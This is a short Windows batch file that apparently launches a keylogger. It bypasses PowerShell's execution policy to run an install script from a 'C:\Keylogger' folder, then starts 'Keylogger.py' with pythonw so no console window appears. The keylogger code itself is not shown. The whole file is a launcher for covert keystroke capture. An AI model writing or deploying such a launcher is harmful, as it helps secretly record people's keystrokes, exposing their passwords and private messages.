@echo off
REM Run the PowerShell script to install Python
powershell -NoProfile -ExecutionPolicy Bypass -File "C:\Keylogger\install_python.ps1"

REM Run the keylogger script itself
pythonw "C:\Keylogger\Keylogger.py"

exit